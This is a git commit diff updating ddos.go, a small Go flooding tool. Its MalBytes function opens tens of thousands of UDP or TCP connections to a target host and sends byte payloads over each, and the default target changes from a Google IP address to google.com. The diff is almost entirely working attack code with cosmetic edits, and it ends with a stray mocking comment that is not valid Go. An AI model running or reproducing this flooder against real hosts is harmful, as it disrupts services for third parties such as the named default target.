4422057500a5a0668e0c01c8fba9fbd02b98f641
FonderElite <s1170044@usls.edu.ph>
2021-06-23 07:00:52 +0000

    Update ddos.go

--- Intermediate/ddos.go
+++ Intermediate/ddos.go
@@ -4,11 +4,10 @@ import (
 "net/http"
 "flag"
 "log"
-"os"
 "time"
 "bufio"
 "net"
-
+"os"
 )
 type Ddos struct{
 ip string
@@ -27,20 +26,20 @@ func Banner(){
 `
 fmt.Println(banner_print)
 time.Sleep(1)
-fmt.Println("Made By FonderElite | Github:FonderElite")
+fmt.Println("Made By FonderElite | Github: https://github.com/FonderElite")
 }
 func Request(ipadd string) *Ddos{
 ip_a := Ddos{ip: ipadd}
 req,err := http.Get("http://" + ipadd)
 if err != nil{
-log.Fatal(err)
+fmt.Println("Try.")
 }else{
 fmt.Println("[!]Checking if the host is up..." )
 if req.StatusCode == 200 && req.StatusCode != 400{
 time.Sleep(2)
 fmt.Printf("[%v]Success Status-code.",req.StatusCode)
 }else{
-fmt.Printf("[%v]Host Seems down",req.StatusCode)
+fmt.Printf("[%v]Host Seems down.",req.StatusCode)
 fmt.Println("Terminating Go Program...")
 time.Sleep(1 * time.Second)
 os.Exit(1)
@@ -52,9 +51,10 @@ return &ip_a
 func MalBytes(site string,port string, bytes int,request int,protocol string)*Ddos{
 ip_ac := Ddos{ip: site,port: port,bytes:bytes, requests: request, protocol:protocol}
 p := make([]byte,ip_ac.bytes)
-for i := 0; i <  ip_ac.requests; i++{
+for i := 0; i <  int(ip_ac.requests); i++{
         conn,err := net.Dial(ip_ac.protocol,ip_ac.ip + ":" + ip_ac.port)
-        fmt.Printf("\n[%v]Sending Bytes->%v",ip_ac.requests,ip_ac.ip)
+        fmt.Printf("\n[%v]Sending Bytes-> %v",ip_ac.bytes,ip_ac.ip)
+        fmt.Printf("\nSending Requests[%v]-> %v",i,ip_ac.ip)
 if err != nil{
 log.Fatal(err)
 }
@@ -67,9 +67,9 @@ log.Fatal(err)
 return &ip_ac
 }
 func main(){
-first_arg :=  flag.String("domain", "142.250.204.78", "Domain Name")
+first_arg :=  flag.String("domain", "google.com", "Domain Name")
 second_arg := flag.String("port", "80", "Port to connect")
-third_arg := flag.Int("bytes",1024,"Amount of bytes to send")
+third_arg := flag.Int("bytes",32,"Amount of bytes to send")
 fourth_arg := flag.Int("requests",65000,"Number of requests to send.")
 fifth_arg := flag.String("protocol","udp","udp/tcp")
 flag.Parse()
@@ -77,3 +77,4 @@ Banner()
 Request(*first_arg)
 MalBytes(*first_arg,*second_arg,*third_arg,*fourth_arg,*fifth_arg)
 }
+#Learn to code, skiddies.
